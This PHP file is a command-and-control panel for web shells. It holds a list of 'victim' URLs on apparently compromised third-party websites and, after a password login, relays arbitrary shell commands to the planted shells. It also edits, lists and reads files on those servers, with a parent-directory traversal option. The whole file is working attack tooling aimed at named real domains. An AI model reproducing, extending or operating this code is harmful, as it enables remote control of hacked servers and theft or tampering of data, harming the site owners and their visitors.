<?php 
header('Access-Control-Allow-Origin: *');
$_POST = json_decode(file_get_contents('php://input'), true);;
$USERNAME = "XX" ;
$PASSWORD = "XX";
$VICTIMES = array();
array_push($VICTIMES, 'http://www.sec02.com/tst.php');
array_push($VICTIMES, 'http://www.fastercom.eu/include/tp.php');
//array_push($VICTIMES, 'http://localhost/m/tp.php');
array_push($VICTIMES, 'http://nexor.fr/libraries/cms/r.php');
array_push($VICTIMES, 'http://imansclothing.com/wp-content/themes/3.php');

function generateRandomKey($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function binToBolean($value){
	if($value==='1')return true ;
	else {
		return false ;
	}
}
function printError(){
	$message = array ();
	$message['status'] = false ;
	echo json_encode($message);
	die();
}
function printSucess($data = NULL){
	$message['data'] = array ();
	$message['status'] = true ;
	if(isset($data)){
		$message['data']  = $data ;
	}
	
	echo json_encode($message);
	die();
}
function file_post_contents( $link , $data = NULL ){
	if(isset($data)){
	$options = array('http' => array(
		'method'  => 'POST',
		'content' => http_build_query($data)
	));
	$context  = stream_context_create($options);
	$result = file_get_contents($link, false, $context);
	return $result ;
	}
	else {
		return file_get_contents($link);

	}
}
function getVictDetails($VICTIMES ,$id = NULL){
	if(isset($id)){}
		else {
			$i = 0 ;
			foreach ($VICTIMES as $value ) {
				$LINK = $VICTIMES[$i]."?action=Details";
				$VICTIMES[$i] = json_decode(file_get_contents($LINK) , true);
				$VICTIMES[$i]['id'] = $i ;
				$i ++ ;
			}
			return $VICTIMES ;

		}	
	}

	if(isset($_POST['action'])){

		$action =  $_POST['action'] ;
		if($action==='login'){
			if( ($_POST['username'] ===$USERNAME && $_POST['password'] ===$PASSWORD )&& isset($_POST['username'] , $_POST['password'])){

				$data = getVictDetails($VICTIMES) ;
				printSucess($data);

			}
			else {
				printError();

			}
		}
		else if($action ==="doCmd"){
			if(!isset($_POST['id'] , $_POST['cmd'])){
				echo json_encode($_POST);
				//printError();

			}
			else {

				$link = $VICTIMES[$_POST['id']]."?action=doCmd" ;
				$post  = array();
				$post["cmd"] =$_POST['cmd'];
				$return = file_post_contents($link , $post);
				printSucess($return );


			}
		}
		else if($action ==="editFile"){
			$link = $VICTIMES[$_POST['id']]."?action=editFile" ;
			$post  = array();
			$post["path"] =$_POST['path'];
			$post["contenu"] =$_POST['contenu'];
			$return = binToBolean(file_post_contents($link , $post));
			printSucess($return );
		}
		else if($action ==="getFiles"){
		if(isset($_POST['ac'])){

			$_POST['path'] = $_POST['path']."/../" ;
			
		}
		if($_POST['type'] == 0 && isset($_POST['type'])){

		$post  = array();
		$post["path"] =$_POST['path'];
		$link = $VICTIMES[$_POST['id']]."?action=getFileContent" ;
		$return = file_post_contents($link , $post);
		
		printSucess($return );
		}
		else {
		$post  = array();
		$post["path"] =$_POST['path'];
		$link = $VICTIMES[$_POST['id']]."?action=getFiles" ;
		$return = json_decode(file_post_contents($link , $post) , true);
		printSucess($return );

		}
		


	}


	}
	
	else {
		printError();
	}
	?>